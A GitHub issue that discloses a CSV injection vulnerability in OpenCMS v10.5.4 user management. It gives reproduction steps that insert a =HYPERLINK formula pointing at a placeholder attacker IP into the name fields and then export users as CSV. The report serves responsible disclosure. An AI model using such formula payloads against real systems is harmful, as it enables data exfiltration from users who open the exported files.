## Description

![@varchashva](https://avatars.githubusercontent.com/u/33921557?u=b0e755e0669a112d0dbe65fbf08c42ed078aeaff&v=4&size=48)[varchashva](https://github.com/varchashva)opened [on Apr 8, 2019](https://github.com/alkacon/opencms-core/issues/636#issue-430376699)

Hello Team,

I would like to report a vulnerability (CSV Injection) which I have observed in current version v10.5.4 and before.

When a spreadsheet program such as Microsoft Excel or LibreOffice Calc is used to open a CSV, any cells starting with '=' will be interpreted by the software as a formula. Maliciously crafted formulas can be used for three key attacks:

* Hijacking the user's computer by exploiting vulnerabilities in the spreadsheet software, such as [CVE-2014-3524](https://github.com/advisories/GHSA-7h2p-mc8p-mxwq "CVE-2014-3524")
* Hijacking the user's computer by exploiting the user's tendency to ignore security warnings in spreadsheets that they downloaded from their own website
* Exfiltrating contents from the spreadsheet, or other open spreadsheets.

Please refer <https://www.owasp.org/index.php/CSV_Injection> for more details.

Impacted URL is http://[your\_webserver\_ip]/opencms/system/workplace/admin/accounts/user\_new.jsp

**Steps to reproduce:**

1. Browse to Quick Launch -> Account Management -> User Management -> New User

   Insert `=HYPERLINK("http://[attacker_ip:port]/GiveMeSomeData","IAmSafe")` in First Name and Last Name field

2. Now export all user information in CSV by using export feature in application.

   Quick Launch -> Account Management -> User Management -> Export User
3. Once user opens the affected CSV file, payload will be triggered
